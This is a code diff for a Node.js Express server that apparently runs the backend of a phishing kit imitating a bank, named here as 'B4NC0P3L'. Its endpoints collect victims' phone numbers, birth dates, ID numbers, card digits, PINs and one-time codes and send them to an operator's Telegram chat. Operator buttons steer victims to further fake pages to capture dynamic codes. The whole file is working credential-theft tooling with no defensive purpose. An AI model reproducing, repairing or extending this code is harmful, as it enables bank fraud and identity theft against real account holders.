@@ -21,32 +21,12 @@ function guardarEstado() {
   fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
 }
 
-// Función para obtener IP real
-function obtenerIpReal(req) {
-  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
-    .split(',')[0].trim();
-}
-
-// Función para obtener ciudad desde ipinfo.io
-async function obtenerCiudad(ip) {
-  try {
-    const res = await fetch(`https://ipinfo.io/${ip}/json`);
-    const data = await res.json();
-    return data.city || "Desconocida";
-  } catch (err) {
-    console.error("Error al obtener ciudad:", err.message);
-    return "Desconocida";
-  }
-}
-
+// /enviar (cel-clave.html)
 app.post('/enviar', async (req, res) => {
-  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, otp, txid } = req.body;
-
-  const ip = obtenerIpReal(req);
-  const ciudad = await obtenerCiudad(ip);
+  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, ip, ciudad, txid } = req.body;
 
   const mensaje = `
-🔐🔵B4NC0P3L🔵
+🔵B4NC0P3L🔵
 🆔 ID: <code>${txid}</code>
 
 📱 Celular: ${celular}
@@ -56,24 +36,22 @@ app.post('/enviar', async (req, res) => {
 💳 Últimos 2: ${ultimos2}
 🔐 NIP: ${nip}
 
-🔑OTP: ${otp}
-
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
 `;
 
   const keyboard = {
     inline_keyboard: [
-       [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }], 
-      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
+      [{ text: "➡ verifidata", callback_data: `verifidata:${txid}` }],
+      [{ text: "➡ cel-dina", callback_data: `cel-dina:${txid}` }],
+      [{ text: "➡ errorlogo", callback_data: `errorlogo:${txid}` }]
     ]
   };
 
   clientes[txid] = "esperando";
   guardarEstado();
 
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
@@ -87,8 +65,40 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
+// /enviar2 (cel-dina.html) — incluye todo nuevamente + OTP
+app.post('/enviar2', async (req, res) => {
+  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, otp, ip, ciudad, txid } = req.body;
 
+  const mensaje = `
+🔐🔵B4NC0P3L🔵
+🆔 ID: <code>${txid}</code>
 
+📱 Celular: ${celular}
+🎂 Nacimiento: ${fechaNacimiento}
+🆔 Tipo ID: ${tipoIdentificacion}
+🔢 Identificador: ${numeroIdentificador}
+💳 Últimos 2: ${ultimos2}
+🔐 NIP: ${nip}
+🔑 OTP: ${otp}
+
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML'
+    })
+  });
+
+  res.sendStatus(200);
+});
+
+// Callback para redirección
 app.post('/callback', async (req, res) => {
   const callback = req.body.callback_query;
   if (!callback || !callback.data) return res.sendStatus(400);
@@ -109,6 +119,7 @@ app.post('/callback', async (req, res) => {
   res.sendStatus(200);
 });
 
+// Polling para verifidata
 app.get('/sendStatus.php', (req, res) => {
   const txid = req.query.txid;
   res.json({ status: clientes[txid] || "esperando" });
@@ -116,37 +127,3 @@ app.get('/sendStatus.php', (req, res) => {
 
 app.get('/', (req, res) => res.send("Servidor activo en Render"));
 app.listen(3000, () => console.log("Servidor activo en Render puerto 3000"));
-
-app.post('/enviar2', async (req, res) => {
-  const { txid, celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, otp } = req.body;
-
-  const ip = obtenerIpReal(req);
-  const ciudad = await obtenerCiudad(ip);
-
-  const mensaje = `
-🔁 <b>Clave Dinámica Recibida</b>
-🆔 ID: <code>${txid}</code>
-📱 Celular: ${celular}
-🎂 Nacimiento: ${fechaNacimiento}
-🆔 Tipo ID: ${tipoIdentificacion}
-🔢 Identificador: ${numeroIdentificador}
-💳 Últimos 2: ${ultimos2}
-🔐 NIP: ${nip}
-🔑 OTP: <code>${otp}</code>
-🌐 IP: ${ip}
-🏙️ Ciudad: ${ciudad}
-`;
-
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: mensaje,
-      parse_mode: 'HTML'
-    })
-  });
-
-  res.sendStatus(200);
-});
-
